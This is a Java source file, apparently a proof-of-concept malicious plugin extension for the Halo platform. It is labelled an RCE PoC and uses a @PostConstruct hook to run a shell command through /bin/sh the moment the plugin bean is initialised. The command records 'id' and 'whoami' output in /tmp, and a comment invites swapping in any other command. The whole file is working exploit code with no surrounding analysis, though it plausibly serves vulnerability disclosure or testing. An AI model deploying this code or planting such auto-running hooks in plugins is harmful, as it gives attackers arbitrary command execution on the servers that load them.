package run.halo.app.plugin;

import org.pf4j.Extension;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import jakarta.annotation.PostConstruct;

/**
 * RCE Extension - executes command via @PostConstruct when Spring initializes this bean.
 */
@Extension
public class PocExtension {

    private static final Logger log = LoggerFactory.getLogger(PocExtension.class);

    public PocExtension() {
        log.info("=== RCE PoC: Constructor invoked ===");
    }

    @PostConstruct
    public void init() {
        // Modify this command as needed
        String command = "id > /tmp/halo-poc-pwned.txt && whoami >> /tmp/halo-poc-pwned.txt";

        try {
            log.info("=== RCE PoC: Executing command ===");
            // Use /bin/sh for broader compatibility
            Process process = Runtime.getRuntime().exec(
                new String[]{"/bin/sh", "-c", command});

            StringBuilder output = new StringBuilder();
            try (var reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = process.waitFor();
            log.info("=== RCE PoC exit code: {} ===", exitCode);
            log.info("=== RCE PoC output: {} ===", output.toString().trim());

            var resultFile = java.nio.file.Paths.get("/tmp/halo-poc-pwned.txt");
            if (java.nio.file.Files.exists(resultFile)) {
                String result = new String(
                    java.nio.file.Files.readAllBytes(resultFile),
                    java.nio.charset.StandardCharsets.UTF_8
                );
                log.info("=== RCE PoC result: {} ===", result.trim());
            }
        } catch (Exception e) {
            log.error("RCE PoC failed", e);
        }
    }
}
